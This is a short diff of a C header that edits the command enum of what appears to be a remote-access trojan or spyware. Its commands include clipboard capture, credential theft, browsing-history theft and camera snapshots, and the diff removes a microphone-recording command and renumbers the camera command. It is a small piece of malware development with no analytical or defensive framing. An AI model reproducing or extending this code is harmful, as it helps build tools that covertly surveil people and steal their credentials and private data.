@@ -34,8 +34,7 @@ typedef enum
     COMMAND_CLIPBOARD_GET = 16,
     COMMAND_CRED_STEAL      = 17,
     COMMAND_HISTORY_STEAL   = 18,
-    COMMAND_MIC_RECORD      = 19,   /* payload: duration in seconds as ASCII */
-    COMMAND_CAMERA_SNAPSHOT = 20
+    COMMAND_CAMERA_SNAPSHOT = 19
 } Command;
 
 typedef struct
